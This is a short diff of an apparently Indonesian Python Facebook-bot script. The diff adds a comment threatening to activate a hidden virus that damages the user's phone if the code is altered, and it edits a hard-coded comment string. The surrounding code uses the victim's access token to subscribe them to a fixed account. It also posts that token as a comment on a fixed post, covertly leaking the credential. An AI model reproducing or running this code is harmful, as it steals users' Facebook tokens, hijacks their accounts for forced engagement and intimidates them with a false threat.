@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 # coding=utf-8
 # Jangan Direcode Tolol !
+# Ada Virus Tersembunyi disini jika ketahuan direcode saia bisa aktifkan virusnya untuk merusak hape anda
 
 ###### IMPORT MODULE ######
 
@@ -119,7 +120,7 @@ def bot():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	kom = ("Gantengnya @[100044932290784:]")
+	kom = ("Gantengnya Ramdani 😍")
 	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + kom + '&access_token=' + toket)
